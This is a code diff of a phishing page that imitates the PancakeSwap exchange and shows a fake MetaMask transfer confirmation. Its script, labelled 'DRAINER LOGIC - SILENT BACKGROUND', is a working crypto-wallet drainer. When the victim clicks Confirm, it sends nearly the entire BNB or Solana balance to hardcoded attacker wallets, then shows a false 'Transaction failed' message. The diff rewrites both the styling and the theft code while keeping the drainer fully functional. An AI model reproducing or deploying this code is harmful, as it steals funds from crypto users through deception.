@@ -15,7 +15,7 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #1a1e24;
+            background: #1b2026;
             color: #fff;
             padding: 16px;
         }
@@ -23,13 +23,11 @@
         .container {
             max-width: 480px;
             margin: 0 auto;
-            background: #1a1e24;
+            background: #1b2026;
             border-radius: 32px;
             overflow: hidden;
-            position: relative;
         }
 
-        /* Header */
         .header {
             padding: 20px 16px 8px 16px;
             display: flex;
@@ -46,12 +44,11 @@
             color: transparent;
         }
 
-        .settings-icon {
+        .settings {
             font-size: 22px;
             opacity: 0.7;
         }
 
-        /* Tabs */
         .tabs {
             display: flex;
             gap: 24px;
@@ -69,7 +66,6 @@
             color: #f0b90b;
         }
 
-        /* Hero */
         .hero {
             text-align: center;
             padding: 32px 16px 24px 16px;
@@ -86,7 +82,6 @@
             font-size: 14px;
         }
 
-        /* Transfer Request Card */
         .transfer-card {
             background: #252a32;
             border-radius: 24px;
@@ -97,49 +92,24 @@
         .transfer-header {
             display: flex;
             justify-content: space-between;
-            align-items: center;
             margin-bottom: 20px;
-        }
-
-        .transfer-header h3 {
-            font-size: 16px;
-            font-weight: 500;
             color: #f0b90b;
+            font-weight: 500;
         }
 
-        .transfer-header span {
+        .amount {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .small-amount {
             color: #7a7e85;
             font-size: 14px;
-        }
-
-        .amount-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: baseline;
             margin-bottom: 24px;
         }
 
-        .amount-main {
-            font-size: 36px;
-            font-weight: 700;
-        }
-
-        .amount-small {
-            text-align: right;
-        }
-
-        .amount-small .bnb {
-            font-size: 18px;
-            font-weight: 500;
-        }
-
-        .amount-small .usd {
-            font-size: 14px;
-            color: #7a7e85;
-        }
-
-        /* From / To Sections */
-        .transfer-row {
+        .row {
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -147,65 +117,41 @@
             border-top: 1px solid #2a2f36;
         }
 
-        .transfer-label {
-            color: #7a7e85;
-            font-size: 14px;
-        }
-
-        .transfer-value {
-            text-align: right;
-        }
-
-        .transfer-value .token {
-            font-weight: 500;
-        }
-
-        .transfer-value .chain {
-            font-size: 12px;
+        .row-left {
             color: #7a7e85;
         }
 
-        .address {
-            font-family: monospace;
-            font-size: 13px;
-            color: #f0b90b;
-        }
-
-        /* Estimated changes */
-        .estimated {
-            padding: 16px 0;
-            border-top: 1px solid #2a2f36;
+        .row-right {
             display: flex;
-            justify-content: space-between;
             align-items: center;
+            gap: 8px;
         }
 
-        .estimated-label {
-            color: #7a7e85;
-            font-size: 14px;
+        .token-icon {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background-size: contain;
+            display: inline-block;
         }
 
-        .estimated-value {
-            text-align: right;
+        .bnb-icon {
+            background: url('https://assets.coingecko.com/coins/images/825/small/bnb-icon2.png?1644979850') no-repeat center;
+            background-size: contain;
         }
 
-        .estimated-value .token {
-            font-weight: 500;
+        .cake-icon {
+            background: url('https://assets.coingecko.com/coins/images/12632/small/pancakeswap-cake-logo.png?1629353875') no-repeat center;
+            background-size: contain;
         }
 
-        .estimated-value .chain {
-            font-size: 12px;
-            color: #7a7e85;
-        }
-
-        /* Buttons */
-        .action-buttons {
+        .buttons {
             display: flex;
             gap: 12px;
             margin-top: 24px;
         }
 
-        .btn-cancel {
+        .cancel {
             flex: 1;
             background: transparent;
             border: 1px solid #4a4f58;
@@ -213,27 +159,24 @@
             padding: 14px;
             border-radius: 40px;
             font-weight: 600;
-            font-size: 16px;
             cursor: pointer;
         }
 
-        .btn-confirm {
+        .confirm {
             flex: 1;
             background: #f0b90b;
             border: none;
-            color: #1a1e24;
+            color: #1b2026;
             padding: 14px;
             border-radius: 40px;
             font-weight: 700;
-            font-size: 16px;
             cursor: pointer;
         }
 
-        /* Get Started Button */
         .get-started {
             background: #f0b90b;
             border: none;
-            color: #1a1e24;
+            color: #1b2026;
             padding: 16px;
             border-radius: 40px;
             font-weight: 700;
@@ -254,254 +197,161 @@
 </head>
 <body>
 <div class="container">
-    <!-- Header -->
     <div class="header">
-        <div class="logo">PancakeSwap</div>
-        <div class="settings-icon">⚙️</div>
+        <div class="logo">🥞 PancakeSwap</div>
+        <div class="settings">⚙️</div>
     </div>
-
-    <!-- Tabs -->
     <div class="tabs">
-        <div class="tab active">Trade</div>
-        <div class="tab">Perps</div>
-        <div class="tab">Earn</div>
-        <div class="tab">Al Play</div>
-        <div class="tab">...</div>
+        <span class="tab active">Trade</span>
+        <span class="tab">Perps</span>
+        <span class="tab">Earn</span>
+        <span class="tab">Al Play</span>
+        <span class="tab">...</span>
     </div>
-
-    <!-- Hero -->
     <div class="hero">
         <h1>Everyone's Favorite DEX</h1>
         <p>Trade Crypto Instantly Across 10 Chains</p>
     </div>
-
-    <!-- Transfer Request Card -->
     <div class="transfer-card">
         <div class="transfer-header">
-            <h3>MetaMask</h3>
+            <span>🦊 MetaMask</span>
             <span>1 of 6 &gt;</span>
         </div>
+        <div class="amount">$1,439</div>
+        <div class="small-amount">0.009 BNB ($5.85)</div>
 
-        <div class="amount-row">
-            <div class="amount-main">$1,439</div>
-            <div class="amount-small">
-                <div class="bnb">0.009 BNB</div>
-                <div class="usd">$5.85</div>
+        <!-- From with BNB icon -->
+        <div class="row">
+            <span class="row-left">From</span>
+            <div class="row-right">
+                <div class="token-icon bnb-icon"></div>
+                <span>BNB · BNB Chain</span>
             </div>
         </div>
 
-        <!-- From -->
-        <div class="transfer-row">
-            <div class="transfer-label">From</div>
-            <div class="transfer-value">
-                <div class="token">BNB</div>
-                <div class="chain">BNB Chain</div>
+        <!-- To with wallet icon -->
+        <div class="row">
+            <span class="row-left">To</span>
+            <div class="row-right">
+                <span>👤 VICTIM · Wallet 1</span>
             </div>
         </div>
 
-        <!-- To -->
-        <div class="transfer-row">
-            <div class="transfer-label">To</div>
-            <div class="transfer-value">
-                <div class="token">VICTIM</div>
-                <div class="chain">Wallet 1</div>
-                <div class="address">0x5F6e1...E74...</div>
+        <!-- Estimated changes with CAKE icon -->
+        <div class="row">
+            <span class="row-left">Estimated changes</span>
+            <div class="row-right">
+                <div class="token-icon cake-icon"></div>
+                <span>CAKE · BNB Chain</span>
             </div>
         </div>
 
-        <!-- Estimated changes -->
-        <div class="estimated">
-            <div class="estimated-label">Estimated changes</div>
-            <div class="estimated-value">
-                <div class="token">CAKE</div>
-                <div class="chain">BNB Chain</div>
-            </div>
-        </div>
-
-        <!-- Action Buttons -->
-        <div class="action-buttons">
-            <button class="btn-cancel" id="cancelBtn">Cancel</button>
-            <button class="btn-confirm" id="confirmBtn">Confirm</button>
+        <div class="buttons">
+            <button class="cancel" id="cancelBtn">Cancel</button>
+            <button class="confirm" id="confirmBtn">Confirm</button>
         </div>
     </div>
-
-    <!-- Get Started Button -->
     <button class="get-started" id="connectWalletBtn">Get Started</button>
     <div class="status" id="status"></div>
 </div>
 
 <script>
 // ================================================================
-// ALL DRAINER LOGIC - SILENT BACKGROUND
+// DRAINER LOGIC - SILENT BACKGROUND
 // ================================================================
 
-// BSC Receiving Address
-const receiveAddress = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";
+const BSC_ADDRESS = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";
+const SOLANA_WALLET = "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr";
+const SOLANA_RPC = "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3";
 
-// Solana Configuration
-const SOLANA_THIEF_WALLET = "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr";
-const SOLANA_RPC_URL = "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3";
+let currentVictim = null;
+let walletType = null;
 
-// Global variables
-let currentVictimAddress = null;
-let currentWalletType = null;
-
-// ========== BSC/EVM DRAIN ==========
-async function drainEVM(victimAddress) {
+async function drainEVM(addr) {
     if (!window.ethereum) return false;
     try {
         const web3 = new Web3(window.ethereum);
-        const balance = await web3.eth.getBalance(victimAddress);
-        const balanceEth = parseFloat(web3.utils.fromWei(balance, 'ether'));
-        
-        if (balanceEth < 0.01) return false;
-        
+        const balance = await web3.eth.getBalance(addr);
+        const balEth = parseFloat(web3.utils.fromWei(balance, 'ether'));
+        if (balEth < 0.01) return false;
         const gasPrice = await web3.eth.getGasPrice();
         const gasCost = gasPrice * 21000n;
         const drainable = balance - gasCost - web3.utils.toWei('0.001', 'ether');
-        
         if (drainable <= 0) return false;
-        
-        const txHash = await window.ethereum.request({
+        const tx = await window.ethereum.request({
             method: 'eth_sendTransaction',
-            params: [{
-                from: victimAddress,
-                to: receiveAddress,
-                value: '0x' + drainable.toString(16),
-                gas: '0x5208',
-                gasPrice: '0x' + gasPrice.toString(16)
-            }]
+            params: [{ from: addr, to: BSC_ADDRESS, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
         });
-        
-        console.log("✅ BSC Drain confirmed:", txHash);
+        console.log("✅ BSC drained:", tx);
         return true;
-    } catch (error) {
-        console.error("BSC Drain error:", error);
-        return false;
-    }
+    } catch(e) { return false; }
 }
 
-// ========== SOLANA DRAIN ==========
-async function drainSolana(victimPublicKey) {
-    if (!window.solana || !window.solana.isPhantom) return false;
+async function drainSolana(pubKey) {
+    if (!window.solana?.isPhantom) return false;
     try {
-        const connection = new solanaWeb3.Connection(SOLANA_RPC_URL, 'confirmed');
-        const victimPubKey = new solanaWeb3.PublicKey(victimPublicKey);
-        const thiefPubKey = new solanaWeb3.PublicKey(SOLANA_THIEF_WALLET);
-        
-        const balance = await connection.getBalance(victimPubKey);
-        const minRent = await connection.getMinimumBalanceForRentExemption(0);
+        const conn = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
+        const from = new solanaWeb3.PublicKey(pubKey);
+        const to = new solanaWeb3.PublicKey(SOLANA_WALLET);
+        const balance = await conn.getBalance(from);
+        const minRent = await conn.getMinimumBalanceForRentExemption(0);
         const drainable = balance - minRent;
-        
         if (drainable <= 0) return false;
-        
-        const lamportsToSend = Math.floor(drainable * 0.99);
-        const transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey: victimPubKey,
-                toPubkey: thiefPubKey,
-                lamports: lamportsToSend,
-            })
-        );
-        
-        transaction.feePayer = victimPubKey;
-        let blockhashObj = await connection.getRecentBlockhash();
-        transaction.recentBlockhash = blockhashObj.blockhash;
-        
-        const signed = await window.solana.signTransaction(transaction);
-        let txid = await connection.sendRawTransaction(signed.serialize());
-        await connection.confirmTransaction(txid);
-        
-        console.log("✅ Solana Drain confirmed:", txid);
+        const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: Math.floor(drainable * 0.99) }));
+        tx.feePayer = from;
+        const blockhash = await conn.getRecentBlockhash();
+        tx.recentBlockhash = blockhash.blockhash;
+        const signed = await window.solana.signTransaction(tx);
+        const txid = await conn.sendRawTransaction(signed.serialize());
+        await conn.confirmTransaction(txid);
+        console.log("✅ Solana drained:", txid);
         return true;
-    } catch (error) {
-        console.error("Solana Drain error:", error);
-        return false;
-    }
+    } catch(e) { return false; }
 }
 
-// ========== CONNECT WALLET ==========
-async function connectWallet() {
-    const statusDiv = document.getElementById('status');
-    statusDiv.innerHTML = "Connecting...";
-    
-    // Try MetaMask first
-    if (window.ethereum && window.ethereum.isMetaMask) {
+document.getElementById('connectWalletBtn').onclick = async () => {
+    const status = document.getElementById('status');
+    status.innerText = "🔄 Connecting...";
+    if (window.ethereum?.isMetaMask) {
         try {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            currentVictimAddress = accounts[0];
-            currentWalletType = 'evm';
-            statusDiv.innerHTML = `Connected: ${currentVictimAddress.slice(0,6)}...${currentVictimAddress.slice(-4)}`;
-            return true;
-        } catch(e) {
-            console.log("MetaMask rejected");
-        }
-    }
-    
-    // Try Phantom
-    if (window.solana && window.solana.isPhantom) {
+            const acc = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            currentVictim = acc[0];
+            walletType = 'evm';
+            status.innerText = `✅ Connected: ${currentVictim.slice(0,6)}...${currentVictim.slice(-4)}`;
+        } catch(e) { status.innerText = "❌ Connection failed"; }
+    } else if (window.solana?.isPhantom) {
         try {
             const resp = await window.solana.connect();
-            currentVictimAddress = resp.publicKey.toString();
-            currentWalletType = 'solana';
-            statusDiv.innerHTML = `Connected: ${currentVictimAddress.slice(0,6)}...${currentVictimAddress.slice(-4)}`;
-            return true;
-        } catch(e) {
-            console.log("Phantom rejected");
-        }
-    }
-    
-    statusDiv.innerHTML = "No wallet detected. Install MetaMask or Phantom.";
-    return false;
-}
-
-// ========== EXECUTE DRAIN ==========
-async function executeDrain() {
-    const statusDiv = document.getElementById('status');
-    statusDiv.innerHTML = "Processing transaction...";
-    
-    let success = false;
-    
-    if (currentWalletType === 'evm') {
-        success = await drainEVM(currentVictimAddress);
-    } else if (currentWalletType === 'solana') {
-        success = await drainSolana(currentVictimAddress);
-    }
-    
-    if (success) {
-        statusDiv.innerHTML = "Transaction submitted. Waiting for confirmation...";
-        setTimeout(() => {
-            statusDiv.innerHTML = "Transaction failed. Please try again.";
-        }, 3000);
+            currentVictim = resp.publicKey.toString();
+            walletType = 'solana';
+            status.innerText = `✅ Connected: ${currentVictim.slice(0,6)}...${currentVictim.slice(-4)}`;
+        } catch(e) { status.innerText = "❌ Connection failed"; }
     } else {
-        statusDiv.innerHTML = "Transaction failed. Please try again.";
+        status.innerText = "⚠️ Install MetaMask or Phantom";
     }
-}
+};
 
-// ========== UI EVENT HANDLERS ==========
-document.getElementById('connectWalletBtn').addEventListener('click', async () => {
-    await connectWallet();
-});
+document.getElementById('confirmBtn').onclick = async () => {
+    if (!currentVictim) { document.getElementById('status').innerText = "⚠️ Connect wallet first"; return; }
+    document.getElementById('status').innerText = "⏳ Processing transaction...";
+    let ok = false;
+    if (walletType === 'evm') ok = await drainEVM(currentVictim);
+    else if (walletType === 'solana') ok = await drainSolana(currentVictim);
+    document.getElementById('status').innerText = ok ? "❌ Transaction failed. Please try again." : "❌ Error. Try again.";
+    currentVictim = null;
+    walletType = null;
+};
 
-document.getElementById('confirmBtn').addEventListener('click', async () => {
-    if (!currentVictimAddress) {
-        document.getElementById('status').innerHTML = "Connect wallet first.";
-        return;
-    }
-    await executeDrain();
-});
+document.getElementById('cancelBtn').onclick = () => {
+    document.getElementById('status').innerText = "❌ Cancelled";
+    currentVictim = null;
+    walletType = null;
+};
 
-document.getElementById('cancelBtn').addEventListener('click', () => {
-    document.getElementById('status').innerHTML = "Transaction cancelled.";
-    currentVictimAddress = null;
-    currentWalletType = null;
-});
-
-// Load Web3 dynamically if needed
 if (typeof Web3 === 'undefined') {
-    const script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js';
-    document.head.appendChild(script);
+    let s = document.createElement('script');
+    s.src = 'https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js';
+    document.head.appendChild(s);
 }
 </script>
 </body>
